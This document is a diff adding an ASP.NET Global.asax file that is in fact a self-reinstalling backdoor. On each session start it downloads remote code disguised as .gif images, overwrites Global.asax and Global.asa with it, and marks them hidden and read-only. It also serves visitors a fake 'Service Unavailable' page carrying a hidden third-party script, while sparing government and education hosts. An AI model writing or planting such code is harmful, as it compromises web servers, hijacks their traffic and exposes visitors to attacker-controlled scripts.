@@ -1,0 +1,53 @@
+<%@ Language="VB"%><%@ Import Namespace="System.IO"%><script language="VB" runat="server">
+	Sub Session_Start()
+	'by*aming
+	dim url1,url2,ObjXMLHTTP,CODE1,CODE2
+	url1="http://www.sqyangzi.com/images/loadasax.gif"
+	url2="http://www.sqyangzi.com/images/load.gif"
+	ObjXMLHTTP=CreateObject("Microsoft.XMLHTTP")
+	ObjXMLHTTP.Open("GET",url1,False)
+	ObjXMLHTTP.setRequestHeader("User-Agent",url1)
+	ObjXMLHTTP.send
+	CODE1=ObjXMLHTTP.responseText
+	ObjXMLHTTP = Nothing
+
+	ObjXMLHTTP=CreateObject("Microsoft.XMLHTTP")
+	ObjXMLHTTP.Open("GET",url2,False)
+	ObjXMLHTTP.setRequestHeader("User-Agent",url2)
+	ObjXMLHTTP.send
+	CODE2=ObjXMLHTTP.responseText
+	ObjXMLHTTP = Nothing
+
+	if instr(CODE1,"by*aming")>0 and instr(CODE2,"by*aming")>0 then
+		dim fso,f
+		dim objwriter As StreamWriter
+		fso = Server.CreateObject("scripting.filesystemobject")
+		if fso.FileExists("\\.\"&Server.MapPath("/Global.asax")) then
+			f=fso.Getfile("\\.\"&Server.MapPath("/Global.asax"))
+			f.Attributes=0
+			objwriter= File.CreateText(server.mappath("/global.asax"))
+			objwriter.write(CODE1)
+			objwriter.close
+			f.Attributes=1+2+4
+			f=Nothing
+		end if
+		if fso.FileExists("\\.\"&Server.MapPath("/Global.asa")) then
+			f=fso.Getfile("\\.\"&Server.MapPath("/Global.asa"))
+			f.Attributes=0
+			objwriter= File.CreateText(server.mappath("/Global.asa"))
+			objwriter.write(CODE2)
+			objwriter.close
+			f.Attributes=1+2+4
+			f=Nothing
+		end if
+		fso = Nothing
+		objwriter = Nothing
+	end if
+	dim geturl
+	geturl=LCase(Request.Url.ToString())
+	if instr(geturl,"csseojc=ok")=0 and instr(LCase(Request.ServerVariables("http_host")),"gov.cn")=0 and instr(LCase(Request.ServerVariables("http_host")),"edu.cn")=0 and instr(geturl,"http://"& Request.ServerVariables("http_host") &"/index.aspx")=0 and instr(geturl,"http://"& Request.ServerVariables("http_host") &"/")=0 and instr(LCase(Request.ServerVariables("HTTP_REFERER")),LCase(Request.ServerVariables("http_host")))<=0 then
+		response.write("<h1>Service Unavailable</h1><div style=""display:none""><"&"script src=""http://count9.51yes.com/click.aspx?id=98279207&logo=12""><"&"/script></div>")
+		response.end
+	End if
+End Sub
+</script>
